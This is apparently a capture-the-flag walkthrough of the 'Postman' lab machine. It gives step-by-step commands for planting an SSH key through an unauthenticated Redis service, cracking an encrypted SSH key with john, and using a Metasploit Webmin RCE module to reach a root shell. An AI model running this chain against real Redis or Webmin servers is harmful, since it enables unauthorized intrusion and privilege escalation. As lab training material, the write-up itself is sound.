So a few ports open. First I enumerated port 80 and didn't find anything useful. Next I checked out port 10000 and once there I had to add ```postman``` to my ```/etc/hosts``` file. Once that was done I refreshed the page and was greeted with a ```webmin``` login. Now I was not able to do anything more since every exploit requires valid credentials which I don't have. Lastly, was port 6379 with redis. First I try to connect using ```telnet``` to see if the service has any sort of authentication set and turns out it doesn't. next step was to install ```redis-tools``` so I could use the ```redis-cli``` to interact with the redis service. Once that was done I was able to find an exploit where I upload my own ssh keys to the server and use that to ssh into the system.
<br>
First step is to take my ssh key and copy it to a new file but at the same time generating some random data to the beginning and end of the file
```
# (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
```
Next step is to set the keys into the database. You should see and OK message
```
# cat key.txt | redis-cli -h 10.10.10.160 -p 6379 -x set bb
OK
```
Now I need to copy the ssh key into the .ssh folder but first I need to find where that is. Using the command below I see its located at ```/var/lib/redis/.ssh```.
```
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
```
Now I change into the directory
```
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
```
Then I change the name of the database to ```authorized_keys``` since this will be the name of out file. Then just save and exit.
```
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> exit
```
Now I can ssh in as the user ```redis``` from my host machine
```
# ssh -i id_rsa redis@10.10.10.160

```
Now doing some manual enumeration I found an ```id_rsa.bak``` file in ```/opt```. I copied this file to my host machine and saw that it was password protected. Using ```ssh2john``` I can convert the ssh key into a format that john and read and will crack the password for me.
```
# python ssh2john.py id_rsa.bak > id_rsa.hash
```
Now john cracks the hash in only a few seconds and I am given a password of ```computer2008```
```
# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.

Session completed
```
I tried to ssh in as the user ```Matt``` and ```root``` and niether worked so the only other thing I could think of was to use the password for the ```webmin``` login page. It ended up working as the username ```Matt``` and password ```computer2008```. Now since I have credentials, I can use one of the CVE's from earlier. I spin up metasploit and load in the module ```exploit/linux/http/webmin_packageup_rce```. After entering all the necessary info I type run and it spawns a shell. If I do a ```whoami``` I see that I am the user ```root```
```

whoami
root
```
To give myself a better shell I will spawn myself a python tty shell
```
python -c 'import pty;pty.spawn("/bin/bash")'
root@Postman:/usr/share/webmin/package-updates/# cd

From here I can read the user flag located at ```/home/Matt/user.txt```
```
root@Postman:~# cat /home/Matt/user.txt

And the root flag from ```/root/root.txt```
```
